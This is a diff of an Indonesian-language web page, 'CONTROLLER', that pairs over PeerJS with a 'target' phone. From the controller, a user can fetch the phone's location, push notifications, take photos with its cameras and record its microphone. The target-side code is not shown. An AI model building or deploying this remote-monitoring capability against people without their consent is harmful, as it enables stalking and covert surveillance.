@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-  <title>CONTROLLER - Pengendali</title>
+  <title>CONTROLLER - Mengontrol</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -13,634 +13,181 @@
       padding: 20px;
     }
     .container {
-      max-width: 600px;
+      max-width: 550px;
       margin: 0 auto;
       background: white;
       border-radius: 40px;
       padding: 24px;
-      box-shadow: 0 20px 40px rgba(0,0,0,0.2);
     }
-    h1 { color: #0277bd; font-size: 1.6rem; margin-bottom: 5px; }
-    .sub { color: #666; font-size: 0.8rem; margin-bottom: 20px; }
-    
-    .pairing-section {
+    h1 { color: #0277bd; font-size: 1.6rem; }
+    .pair-section {
       background: #e1f5fe;
       border-radius: 28px;
       padding: 16px;
-      margin-bottom: 20px;
+      margin: 15px 0;
     }
-    .pair-input {
-      display: flex;
-      gap: 12px;
-      margin-top: 12px;
-      flex-wrap: wrap;
-    }
-    .pair-input input {
-      flex: 1;
-      padding: 14px 18px;
-      border-radius: 48px;
-      border: 1px solid #4fc3f7;
-      font-size: 1rem;
-    }
-    .pair-input button {
-      background: #0288d1;
-      border: none;
-      padding: 14px 24px;
-      border-radius: 48px;
-      color: white;
-      font-weight: bold;
-      cursor: pointer;
-    }
-    .status-connection {
-      background: #0d47a1;
-      color: white;
-      padding: 12px;
-      border-radius: 40px;
-      text-align: center;
-      margin-bottom: 20px;
-      font-weight: bold;
-    }
+    .pair-input { display: flex; gap: 10px; margin-top: 10px; flex-wrap: wrap; }
+    .pair-input input { flex:1; padding: 12px 16px; border-radius: 48px; border: 1px solid #4fc3f7; }
+    .pair-input button { background: #0288d1; border: none; padding: 12px 20px; border-radius: 48px; color: white; font-weight: bold; cursor: pointer; }
+    .status-conn { background: #0d47a1; color: white; padding: 10px; border-radius: 40px; text-align: center; margin: 15px 0; font-weight: bold; }
     .connected { background: #2e7d32; }
-    
-    .buttons-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
-      gap: 12px;
-      margin: 20px 0;
-    }
-    .ctrl-btn {
-      background: white;
-      border: 2px solid #4fc3f7;
-      border-radius: 40px;
-      padding: 14px 6px;
-      font-weight: bold;
-      color: #0277bd;
-      cursor: pointer;
-    }
-    .ctrl-btn:active { transform: scale(0.96); background: #e1f5fe; }
-    .ctrl-btn:disabled { opacity: 0.4; transform: none; }
-    
-    .result-area {
-      background: #f5f5f5;
-      border-radius: 24px;
-      padding: 16px;
-      margin-top: 16px;
-      max-height: 450px;
-      overflow-y: auto;
-    }
-    .result-title {
-      font-weight: bold;
-      color: #0277bd;
-      margin-bottom: 10px;
-    }
-    .result-item {
-      background: white;
-      padding: 12px;
-      border-radius: 16px;
-      margin-bottom: 8px;
-      font-size: 0.8rem;
-      word-break: break-word;
-    }
-    img.result-img { max-width: 100%; border-radius: 16px; margin-top: 8px; cursor: pointer; }
+    .btn-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin: 15px 0; }
+    .ctrl-btn { background: white; border: 2px solid #4fc3f7; border-radius: 48px; padding: 12px; font-weight: bold; color: #0277bd; cursor: pointer; }
+    .ctrl-btn:disabled { opacity: 0.4; }
+    .result-area { background: #f5f5f5; border-radius: 24px; padding: 16px; max-height: 400px; overflow-y: auto; }
+    .result-item { background: white; padding: 12px; border-radius: 16px; margin-bottom: 8px; font-size: 0.8rem; }
+    img { max-width: 100%; border-radius: 12px; margin-top: 8px; cursor: pointer; }
     audio { width: 100%; margin-top: 8px; }
-    
-    .camera-panel {
-      background: #eef5fc;
-      border-radius: 24px;
-      padding: 16px;
-      margin-top: 8px;
-    }
-    .camera-options {
-      display: flex;
-      gap: 14px;
-      margin: 12px 0;
-      flex-wrap: wrap;
-    }
-    .cam-choice {
-      background: #e1f5fe;
-      padding: 12px 20px;
-      border-radius: 40px;
-      font-size: 0.9rem;
-      font-weight: 600;
-      cursor: pointer;
-      border: none;
-      color: #01579b;
-      flex: 1;
-      min-width: 120px;
-    }
-    .cam-choice:active { background: #b3e5fc; transform: scale(0.97); }
-    
-    .preview-video {
-      border-radius: 20px;
-      margin-top: 12px;
-      width: 100%;
-      max-width: 320px;
-      border: 1px solid #b3e5fc;
-      background: #000;
-    }
-    
-    .action-buttons {
-      display: flex;
-      gap: 12px;
-      margin-top: 12px;
-      flex-wrap: wrap;
-    }
-    .action-btn {
-      background: #0288d1;
-      border: none;
-      padding: 12px 18px;
-      border-radius: 40px;
-      color: white;
-      font-weight: bold;
-      cursor: pointer;
-      flex: 1;
-    }
-    .close-btn { background: #ff8a65; }
-    
-    .google-maps-link {
-      display: inline-block;
-      background: #0288d1;
-      color: white;
-      padding: 8px 16px;
-      border-radius: 40px;
-      text-decoration: none;
-      margin-top: 8px;
-      font-weight: bold;
-      font-size: 0.8rem;
-    }
+    .camera-panel { background: #eef5fc; border-radius: 24px; padding: 16px; margin-bottom: 12px; }
+    .cam-choice { background: #e1f5fe; padding: 10px; border-radius: 40px; border: none; margin: 5px; cursor: pointer; font-weight: bold; }
+    video { width: 100%; max-width: 280px; border-radius: 20px; background: #000; margin-top: 10px; }
+    .google-link { background: #0288d1; color: white; padding: 6px 12px; border-radius: 40px; text-decoration: none; display: inline-block; margin-top: 6px; font-size: 0.7rem; }
   </style>
 </head>
 <body>
 <div class="container">
   <h1>🎮 CONTROLLER</h1>
-  <div class="sub">Hubungkan ke HP Target untuk mengontrol</div>
-  
-  <div class="pairing-section">
-    <div style="font-weight:bold;">🔗 Masukkan Kode Pairing Target</div>
+  <div class="pair-section">
+    <div>🔗 Kode Pairing Target</div>
     <div class="pair-input">
-      <input type="text" id="peerIdInput" placeholder="Contoh: 3a4b5c6d-7e8f...">
+      <input type="text" id="peerId" placeholder="Masukkan kode dari target">
       <button id="connectBtn">Hubungkan</button>
     </div>
   </div>
-  
-  <div class="status-connection" id="connectionStatus">
-    ⚪ Belum terhubung
+  <div class="status-conn" id="connStatus">⚪ Belum terhubung</div>
+  <div class="btn-grid">
+    <button class="ctrl-btn" id="btnLoc" disabled>🗾 Lokasi</button>
+    <button class="ctrl-btn" id="btnNotif" disabled>🔔 Notifikasi</button>
+    <button class="ctrl-btn" id="btnCam" disabled>📷 Kamera</button>
+    <button class="ctrl-btn" id="btnMic" disabled>🎙️ Mikrofon</button>
   </div>
-  
-  <div class="buttons-grid">
-    <button class="ctrl-btn" id="btnLokasi" disabled>🗾 Ambil Lokasi</button>
-    <button class="ctrl-btn" id="btnNotif" disabled>🔔 Kirim Notifikasi</button>
-    <button class="ctrl-btn" id="btnKamera" disabled>📷 Akses Kamera</button>
-    <button class="ctrl-btn" id="btnMikrofon" disabled>🎙️ Akses Mikrofon</button>
-  </div>
-  
-  <div class="result-area">
-    <div class="result-title">📡 Hasil dari HP Target</div>
-    <div id="resultList">
-      <div class="result-item">Belum ada hasil, hubungkan dulu ke target</div>
-    </div>
-  </div>
+  <div class="result-area" id="resultArea"><div class="result-item">Hubungkan ke target terlebih dahulu</div></div>
 </div>
-
 <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
 <script>
-  let peer = null;
-  let connection = null;
-  let isConnected = false;
-  
-  // State untuk kamera preview
-  let previewStream = null;
-  let activePanel = null;
-  
-  const resultList = document.getElementById('resultList');
-  const connectionStatus = document.getElementById('connectionStatus');
-  const peerIdInput = document.getElementById('peerIdInput');
-  const connectBtn = document.getElementById('connectBtn');
-  
-  const btns = {
-    lokasi: document.getElementById('btnLokasi'),
-    notif: document.getElementById('btnNotif'),
-    kamera: document.getElementById('btnKamera'),
-    mikrofon: document.getElementById('btnMikrofon')
-  };
-  
-  function enableButtons(enabled) {
-    Object.values(btns).forEach(btn => btn.disabled = !enabled);
+  let peer, conn, isConnected = false;
+  let previewStream = null, currentFacing = 'environment';
+  const resultDiv = document.getElementById('resultArea');
+  const connStatus = document.getElementById('connStatus');
+
+  function addResult(type, data, isErr=false) {
+    const div = document.createElement('div'); div.className = 'result-item';
+    div.style.borderLeft = isErr ? '4px solid #f44336' : '4px solid #4caf50';
+    let html = `<strong>📌 ${type.toUpperCase()}</strong><br>`;
+    if(isErr) html += `⚠️ ${data.error || data}`;
+    else {
+      if(type === 'location') html += `📍 ${data.lat}, ${data.lng}<br>🎯 ±${Math.round(data.accuracy)}m<br><a href="https://www.google.com/maps?q=${data.lat},${data.lng}" target="_blank" class="google-link">🗺 Buka Google Maps</a>`;
+      else if(type === 'notification') html += `🔔 "${data.message}"`;
+      else if(type === 'photo') html += `📸 <img src="${data.image}" class="result-img" onclick="window.open(this.src)"><br><i>Klik gambar untuk zoom</i>`;
+      else if(type === 'audio') html += `🎵 <audio controls src="${data.audio}"></audio><br><a href="${data.audio}" download="rekaman_${Date.now()}.mp3">💾 Download MP3</a>`;
+      else if(type === 'recording_started') html += `🎙️ Merekam... (stop otomatis 15dtk)`;
+      else html += JSON.stringify(data);
+    }
+    div.innerHTML = html;
+    resultDiv.prepend(div);
+    while(resultDiv.children.length > 20) resultDiv.removeChild(resultDiv.lastChild);
   }
-  
-  function addResult(type, data, isError = false) {
-    const div = document.createElement('div');
-    div.className = 'result-item';
-    div.style.borderLeft = isError ? '4px solid #f44336' : '4px solid #4caf50';
-    
-    let content = `<strong>📌 ${type.toUpperCase()}</strong><br>`;
-    
-    if (isError) {
-      content += `⚠️ Error: ${data.error || data}`;
-    } else {
-      switch(type) {
-        case 'location':
-          const lat = data.lat;
-          const lng = data.lng;
-          const acc = data.accuracy;
-          content += `📍 Latitude: ${lat}<br>📍 Longitude: ${lng}<br>🎯 Akurasi: ±${Math.round(acc)} meter`;
-          const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lng}&hl=id&z=18`;
-          content += `<br><a href="${googleMapsUrl}" target="_blank" class="google-maps-link">🗾 Buka di Google Maps</a>`;
-          break;
-        case 'notification':
-          content += `🔔 Notifikasi: "${data.message}"`;
-          break;
-        case 'photo':
-          content += `📸 Foto berhasil diambil:<br><img src="${data.image}" class="result-img" onclick="window.open(this.src)">`;
-          break;
-        case 'audio':
-          content += `🎵 Rekaman suara:<br><audio controls src="${data.audio}"></audio><br><a href="${data.audio}" download="rekaman_${Date.now()}.mp3">💾 Download MP3</a>`;
-          break;
-        case 'recording_started':
-          content += `🎙️ Rekaman dimulai di target... tunggu hingga selesai (max 15 detik)`;
-          break;
-        default:
-          content += JSON.stringify(data);
-      }
-    }
-    
-    div.innerHTML = content;
-    resultList.prepend(div);
-    if (resultList.children.length > 20) {
-      resultList.removeChild(resultList.lastChild);
-    }
+
+  function sendCmd(type, extra={}) {
+    if(!conn || !conn.open) { addResult('error',{error:'Tidak terhubung'},true); return; }
+    conn.send({type, ...extra});
+    addResult('command', `📤 ${type}`);
   }
-  
-  function updateConnectionStatus(text, isConn = false) {
-    isConnected = isConn;
-    connectionStatus.innerHTML = isConn ? `✅ ${text}` : `⚠️ ${text}`;
-    connectionStatus.className = isConn ? 'status-connection connected' : 'status-connection';
-    enableButtons(isConn);
-  }
-  
-  function sendCommand(type, extra = {}) {
-    if (!connection || !connection.open) {
-      addResult('error', { error: 'Tidak terhubung ke target' }, true);
-      return;
-    }
-    connection.send({ type, ...extra });
-    addResult('command', `📤 Mengirim perintah: ${type}`);
-  }
-  
-  function stopPreview() {
-    if (previewStream) {
-      previewStream.getTracks().forEach(track => track.stop());
-      previewStream = null;
-    }
-  }
-  
-  // =============== FITUR KAMERA (BENAR-BENAR DIPERBAIKI) ===============
-  async function onShowCamera() {
-    // Hapus panel sebelumnya
-    if (activePanel && activePanel.parentNode) {
-      stopPreview();
-      activePanel.remove();
-      activePanel = null;
-    }
+
+  // KAMERA dengan preview
+  async function showCamera() {
+    const existing = document.getElementById('camPanel');
+    if(existing) { if(previewStream) previewStream.getTracks().forEach(t=>t.stop()); existing.remove(); }
+    if(!isConnected) { addResult('error',{error:'Hubungkan ke target dulu'},true); return; }
     
-    if (!isConnected) {
-      addResult('error', { error: 'Belum terhubung ke target. Hubungkan dulu!' }, true);
-      return;
-    }
-    
-    // Buat panel kamera
-    const panel = document.createElement('div');
-    panel.className = 'camera-panel';
-    panel.id = 'camera-panel';
-    
-    // Tombol pilih kamera
+    const panel = document.createElement('div'); panel.id = 'camPanel'; panel.className = 'camera-panel';
     const btnDiv = document.createElement('div');
-    btnDiv.className = 'camera-options';
+    const frontBtn = document.createElement('button'); frontBtn.innerText = '🤳 Depan (Mirror)'; frontBtn.className = 'cam-choice';
+    const backBtn = document.createElement('button'); backBtn.innerText = '📸 Belakang'; backBtn.className = 'cam-choice';
+    btnDiv.appendChild(frontBtn); btnDiv.appendChild(backBtn);
     
-    const frontBtn = document.createElement('button');
-    frontBtn.innerText = '🤳 Kamera Depan (Mirror)';
-    frontBtn.className = 'cam-choice';
+    const video = document.createElement('video'); video.autoplay = true; video.playsInline = true; video.muted = true;
+    video.style.width = '100%'; video.style.maxWidth = '280px';
     
-    const backBtn = document.createElement('button');
-    backBtn.innerText = '📸 Kamera Belakang (Normal)';
-    backBtn.className = 'cam-choice';
+    const info = document.createElement('div'); info.style.fontSize='0.7rem'; info.style.margin='10px 0'; info.style.color='#0288d1';
+    info.innerHTML = '📷 Preview kamera ANDA<br>↓ Pilih kamera dulu ↓';
     
-    btnDiv.appendChild(frontBtn);
-    btnDiv.appendChild(backBtn);
+    const captureBtn = document.createElement('button'); captureBtn.innerText = '📸 Ambil Foto dari Target'; captureBtn.style.background='#0288d1'; captureBtn.style.color='white'; captureBtn.style.border='none'; captureBtn.style.padding='12px'; captureBtn.style.borderRadius='40px'; captureBtn.style.fontWeight='bold'; captureBtn.style.width='100%'; captureBtn.style.marginTop='10px'; captureBtn.style.cursor='pointer';
+    const closeBtn = document.createElement('button'); closeBtn.innerText = '❌ Tutup'; closeBtn.style.background='#ff8a65'; closeBtn.style.border='none'; closeBtn.style.padding='10px'; closeBtn.style.borderRadius='40px'; closeBtn.style.marginTop='8px'; closeBtn.style.width='100%'; closeBtn.style.cursor='pointer';
     
-    // Video preview
-    const video = document.createElement('video');
-    video.autoplay = true;
-    video.playsInline = true;
-    video.muted = true;
-    video.className = 'preview-video';
+    panel.appendChild(btnDiv); panel.appendChild(video); panel.appendChild(info); panel.appendChild(captureBtn); panel.appendChild(closeBtn);
+    resultDiv.prepend(panel);
     
-    // Info text
-    const info = document.createElement('div');
-    info.style.margin = '10px 0';
-    info.style.fontSize = '0.8rem';
-    info.style.color = '#0288d1';
-    info.style.textAlign = 'center';
-    info.innerHTML = '📷 Preview kamera Anda (controller)<br>↓ Pilih kamera dulu, lalu klik tombol di bawah ↓';
-    
-    // Tombol aksi
-    const actionDiv = document.createElement('div');
-    actionDiv.className = 'action-buttons';
-    
-    const captureBtn = document.createElement('button');
-    captureBtn.innerText = '📸 Ambil Foto dari Target';
-    captureBtn.className = 'action-btn';
-    
-    const closeBtn = document.createElement('button');
-    closeBtn.innerText = '❌ Tutup';
-    closeBtn.className = 'action-btn close-btn';
-    
-    actionDiv.appendChild(captureBtn);
-    actionDiv.appendChild(closeBtn);
-    
-    panel.appendChild(btnDiv);
-    panel.appendChild(video);
-    panel.appendChild(info);
-    panel.appendChild(actionDiv);
-    
-    // Masukkan ke result area
-    if (resultList.firstChild) {
-      resultList.insertBefore(panel, resultList.firstChild);
-    } else {
-      resultList.appendChild(panel);
-    }
-    activePanel = panel;
-    
-    let selectedFacing = 'environment'; // default belakang
-    let currentPreviewStream = null;
-    
-    // Fungsi mulai preview
-    async function startPreview(facingMode, isMirror) {
-      if (currentPreviewStream) {
-        currentPreviewStream.getTracks().forEach(t => t.stop());
-      }
+    let curStream = null;
+    async function startPreview(facing, mirror) {
+      if(curStream) curStream.getTracks().forEach(t=>t.stop());
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: { exact: facingMode } } 
-        });
-        currentPreviewStream = stream;
-        previewStream = stream;
-        video.srcObject = stream;
-        video.style.transform = isMirror ? 'scaleX(-1)' : 'scaleX(1)';
-        selectedFacing = facingMode;
-        addResult('info', `🎥 Preview kamera ${facingMode === 'user' ? 'DEPAN (mirror)' : 'BELAKANG'} aktif`);
-      } catch (err) {
-        addResult('error', `Gagal preview ${facingMode}: ${err.message}`, true);
-        // Fallback tanpa exact
+        let s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facing } } });
+        curStream = s; previewStream = s;
+        video.srcObject = s;
+        video.style.transform = mirror ? 'scaleX(-1)' : 'scaleX(1)';
+        currentFacing = facing;
+        addResult('info', `Preview ${mirror?'DEPAN':'BELAKANG'} aktif`);
+      } catch(e) {
         try {
-          const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: facingMode } 
-          });
-          currentPreviewStream = stream;
-          previewStream = stream;
-          video.srcObject = stream;
-          video.style.transform = isMirror ? 'scaleX(-1)' : 'scaleX(1)';
-          selectedFacing = facingMode;
-        } catch(e2) {
-          addResult('error', `Preview gagal total`, true);
-        }
+          let s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
+          curStream = s; previewStream = s;
+          video.srcObject = s;
+          video.style.transform = mirror ? 'scaleX(-1)' : 'scaleX(1)';
+          currentFacing = facing;
+        } catch(e2) { addResult('error',{error:'Gagal preview'},true); }
       }
     }
     
-    // Event tombol depan
-    frontBtn.onclick = () => {
-      startPreview('user', true);
-    };
-    
-    // Event tombol belakang
-    backBtn.onclick = () => {
-      startPreview('environment', false);
-    };
-    
-    // Event ambil foto - KIRIM PERINTAH KE TARGET
-    captureBtn.onclick = () => {
-      if (!isConnected) {
-        addResult('error', { error: 'Koneksi ke target terputus!' }, true);
-        return;
-      }
-      // Kirim perintah take_photo dengan facingMode yang dipilih
-      addResult('info', `📸 Mengirim perintah ke target: ambil foto dengan kamera ${selectedFacing === 'user' ? 'DEPAN' : 'BELAKANG'}`);
-      sendCommand('take_photo', { facingMode: selectedFacing });
-    };
-    
-    // Event tutup
-    closeBtn.onclick = () => {
-      if (currentPreviewStream) {
-        currentPreviewStream.getTracks().forEach(t => t.stop());
-      }
-      previewStream = null;
-      if (panel && panel.parentNode) panel.remove();
-      activePanel = null;
-      addResult('info', 'Panel kamera ditutup');
-    };
-    
-    // Auto-start preview kamera belakang
+    frontBtn.onclick = () => startPreview('user', true);
+    backBtn.onclick = () => startPreview('environment', false);
+    captureBtn.onclick = () => { if(isConnected) { addResult('info', `📸 Meminta foto ${currentFacing==='user'?'DEPAN':'BELAKANG'}`); sendCmd('take_photo', {facingMode: currentFacing}); } else addResult('error',{error:'Koneksi putus'},true); };
+    closeBtn.onclick = () => { if(curStream) curStream.getTracks().forEach(t=>t.stop()); panel.remove(); };
     startPreview('environment', false);
   }
-  
-  // =============== FITUR MIKROFON ===============
-  let isRecordingActive = false;
-  let recordingTimeout = null;
-  
-  function onMicrophoneRecorder() {
-    if (!isConnected) {
-      addResult('error', { error: 'Belum terhubung ke target. Hubungkan dulu!' }, true);
-      return;
-    }
-    
-    // Hapus panel sebelumnya
-    const existingPanel = document.getElementById('mic-panel');
-    if (existingPanel) existingPanel.remove();
-    if (recordingTimeout) clearTimeout(recordingTimeout);
-    
-    const panel = document.createElement('div');
-    panel.id = 'mic-panel';
-    panel.style.background = '#eef5fc';
-    panel.style.borderRadius = '24px';
-    panel.style.padding = '16px';
-    panel.style.marginTop = '8px';
-    
-    const statusLabel = document.createElement('span');
-    statusLabel.id = 'micStatus';
-    statusLabel.innerText = '🎤 Belum merekam';
-    statusLabel.style.display = 'block';
-    statusLabel.style.marginBottom = '12px';
-    statusLabel.style.fontWeight = 'bold';
-    
-    const startBtn = document.createElement('button');
-    startBtn.innerText = '🎙️ Mulai Rekam (Target)';
-    startBtn.style.background = '#0288d1';
-    startBtn.style.border = 'none';
-    startBtn.style.padding = '12px 20px';
-    startBtn.style.borderRadius = '40px';
-    startBtn.style.color = 'white';
-    startBtn.style.fontWeight = 'bold';
-    startBtn.style.marginRight = '10px';
-    startBtn.style.cursor = 'pointer';
-    
-    const stopBtn = document.createElement('button');
-    stopBtn.innerText = '⏹️ Stop & Kirim';
-    stopBtn.style.background = '#f44336';
-    stopBtn.style.border = 'none';
-    stopBtn.style.padding = '12px 20px';
-    stopBtn.style.borderRadius = '40px';
-    stopBtn.style.color = 'white';
-    stopBtn.style.fontWeight = 'bold';
-    stopBtn.style.cursor = 'pointer';
-    stopBtn.disabled = true;
-    
-    const closeBtn = document.createElement('button');
-    closeBtn.innerText = '❌ Tutup';
-    closeBtn.style.background = '#ff8a65';
-    closeBtn.style.border = 'none';
-    closeBtn.style.padding = '10px 16px';
-    closeBtn.style.borderRadius = '40px';
-    closeBtn.style.color = 'white';
-    closeBtn.style.fontWeight = 'bold';
-    closeBtn.style.marginTop = '10px';
-    closeBtn.style.cursor = 'pointer';
-    
-    startBtn.onclick = () => {
-      addResult('info', '🎙️ Meminta target mulai merekam suara...');
-      sendCommand('start_record');
-      startBtn.disabled = true;
-      stopBtn.disabled = false;
-      statusLabel.innerText = '🔴 MEREKAM... (klik Stop untuk mengirim)';
-      statusLabel.style.color = '#d32f2f';
-      isRecordingActive = true;
-      
-      // Auto stop setelah 15 detik
-      recordingTimeout = setTimeout(() => {
-        if (isRecordingActive) {
-          addResult('info', '⏰ Auto-stop setelah 15 detik');
-          sendCommand('stop_record');
-          startBtn.disabled = false;
-          stopBtn.disabled = true;
-          statusLabel.innerText = '🎤 Rekaman selesai';
-          statusLabel.style.color = '#000';
-          isRecordingActive = false;
-        }
-      }, 15000);
+
+  // MIKROFON
+  let micPanel = null;
+  function showMicrophone() {
+    if(micPanel && micPanel.parentNode) micPanel.remove();
+    if(!isConnected) { addResult('error',{error:'Hubungkan ke target dulu'},true); return; }
+    const panel = document.createElement('div'); panel.id = 'micPanel'; panel.style.background='#eef5fc'; panel.style.borderRadius='24px'; panel.style.padding='16px'; panel.style.marginBottom='12px';
+    const status = document.createElement('span'); status.id = 'micStatus'; status.innerText = '🎤 Belum merekam'; status.style.display='block'; status.style.marginBottom='12px'; status.style.fontWeight='bold';
+    const startBtn = document.createElement('button'); startBtn.innerText = '🎙️ Mulai Rekam'; startBtn.style.background='#0288d1'; startBtn.style.color='white'; startBtn.style.border='none'; startBtn.style.padding='12px'; startBtn.style.borderRadius='40px'; startBtn.style.marginRight='10px'; startBtn.style.cursor='pointer';
+    const stopBtn = document.createElement('button'); stopBtn.innerText = '⏹️ Stop & Kirim'; stopBtn.style.background='#f44336'; stopBtn.style.color='white'; stopBtn.style.border='none'; stopBtn.style.padding='12px'; stopBtn.style.borderRadius='40px'; stopBtn.style.cursor='pointer'; stopBtn.disabled=true;
+    const closeBtn = document.createElement('button'); closeBtn.innerText = '❌ Tutup'; closeBtn.style.background='#ff8a65'; closeBtn.style.border='none'; closeBtn.style.padding='10px'; closeBtn.style.borderRadius='40px'; closeBtn.style.marginTop='10px'; closeBtn.style.width='100%'; closeBtn.style.cursor='pointer';
+    let active = false, timer;
+    startBtn.onclick = () => { sendCmd('start_record'); startBtn.disabled=true; stopBtn.disabled=false; status.innerText='🔴 MEREKAM...'; status.style.color='#d32f2f'; active=true;
+      timer = setTimeout(()=>{ if(active){ sendCmd('stop_record'); startBtn.disabled=false; stopBtn.disabled=true; status.innerText='🎤 Selesai'; active=false; } },15000);
     };
-    
-    stopBtn.onclick = () => {
-      addResult('info', '⏹️ Meminta target berhenti merekam dan mengirim hasil...');
-      sendCommand('stop_record');
-      if (recordingTimeout) clearTimeout(recordingTimeout);
-      startBtn.disabled = false;
-      stopBtn.disabled = true;
-      statusLabel.innerText = '🎤 Rekaman dihentikan';
-      statusLabel.style.color = '#000';
-      isRecordingActive = false;
-    };
-    
-    closeBtn.onclick = () => {
-      if (recordingTimeout) clearTimeout(recordingTimeout);
-      panel.remove();
-    };
-    
-    panel.appendChild(statusLabel);
-    panel.appendChild(startBtn);
-    panel.appendChild(stopBtn);
-    panel.appendChild(closeBtn);
-    
-    if (resultList.firstChild) {
-      resultList.insertBefore(panel, resultList.firstChild);
-    } else {
-      resultList.appendChild(panel);
-    }
+    stopBtn.onclick = () => { sendCmd('stop_record'); clearTimeout(timer); startBtn.disabled=false; stopBtn.disabled=true; status.innerText='🎤 Dihentikan'; active=false; };
+    closeBtn.onclick = () => { clearTimeout(timer); panel.remove(); micPanel=null; };
+    panel.appendChild(status); panel.appendChild(startBtn); panel.appendChild(stopBtn); panel.appendChild(closeBtn);
+    resultDiv.prepend(panel); micPanel = panel;
   }
-  
-  // =============== KONEKSI PEER ===============
-  function connectToPeer(peerId) {
-    if (connection) {
-      connection.close();
-    }
-    
-    updateConnectionStatus('Menghubungkan...', false);
-    connection = peer.connect(peerId);
-    
-    connection.on('open', () => {
-      updateConnectionStatus(`Terhubung ke ${peerId.substring(0, 15)}...`, true);
-      addResult('connection', `✅ Berhasil terhubung ke target`);
-    });
-    
-    connection.on('data', (data) => {
-      if (data.response) {
-        addResult(data.type, data.data, data.data?.error);
-      } else {
-        addResult('info', data);
-      }
-    });
-    
-    connection.on('close', () => {
-      updateConnectionStatus('Koneksi terputus', false);
-      addResult('connection', '❌ Koneksi ke target terputus', true);
-      connection = null;
-    });
-    
-    connection.on('error', (err) => {
-      updateConnectionStatus('Error koneksi', false);
-      addResult('error', { error: err.toString() }, true);
-    });
+
+  // KONEKSI
+  function connectToPeer(id) {
+    if(conn) conn.close();
+    conn = peer.connect(id);
+    conn.on('open', () => { isConnected=true; connStatus.innerHTML = `✅ Terhubung ke ${id.substring(0,12)}...`; connStatus.className = 'status-conn connected'; document.querySelectorAll('.ctrl-btn').forEach(b=>b.disabled=false); addResult('connection','Berhasil terhubung'); });
+    conn.on('data', d => { if(d.response) addResult(d.type, d.data, d.data?.error); });
+    conn.on('close', () => { isConnected=false; connStatus.innerHTML = '⚠️ Putus'; connStatus.className = 'status-conn'; document.querySelectorAll('.ctrl-btn').forEach(b=>b.disabled=true); addResult('connection','Koneksi putus',true); });
+    conn.on('error', e => addResult('error',{error:e},true));
   }
-  
-  function initPeer() {
+
+  function init() {
     peer = new Peer();
-    
-    peer.on('open', (id) => {
-      console.log('Controller ID:', id);
-    });
-    
-    peer.on('error', (err) => {
-      console.error('Peer error:', err);
-      if (err.type === 'unavailable-id') {
-        addResult('error', 'ID peer tidak valid', true);
-      }
-    });
+    peer.on('open', id => console.log('Controller ID:', id));
+    peer.on('error', e => console.log(e));
+    document.getElementById('connectBtn').onclick = () => { let id = document.getElementById('peerId').value.trim(); if(id) connectToPeer(id); else addResult('error',{error:'Masukkan kode'},true); };
+    document.getElementById('btnLoc').onclick = () => sendCmd('location');
+    document.getElementById('btnNotif').onclick = () => { let msg = prompt('Pesan notifikasi:'); if(msg) sendCmd('notification',{message:msg}); };
+    document.getElementById('btnCam').onclick = showCamera;
+    document.getElementById('btnMic').onclick = showMicrophone;
   }
-  
-  // Event tombol utama
-  btns.lokasi.onclick = () => {
-    if (!isConnected) {
-      addResult('error', { error: 'Belum terhubung ke target!' }, true);
-      return;
-    }
-    sendCommand('location');
-  };
-  
-  btns.notif.onclick = () => {
-    if (!isConnected) {
-      addResult('error', { error: 'Belum terhubung ke target!' }, true);
-      return;
-    }
-    const msg = prompt('✏️ Masukkan pesan notifikasi:', 'Halo dari Controller!');
-    if (msg && msg.trim()) {
-      sendCommand('notification', { message: msg });
-    }
-  };
-  
-  btns.kamera.onclick = onShowCamera;
-  btns.mikrofon.onclick = onMicrophoneRecorder;
-  
-  connectBtn.onclick = () => {
-    const peerId = peerIdInput.value.trim();
-    if (!peerId) {
-      addResult('error', { error: 'Masukkan kode pairing target' }, true);
-      return;
-    }
-    connectToPeer(peerId);
-  };
-  
-  // Minta izin notifikasi
-  if ('Notification' in window) Notification.requestPermission();
-  
-  initPeer();
+  if('Notification' in window) Notification.requestPermission();
+  init();
 </script>
 </body>
 </html>
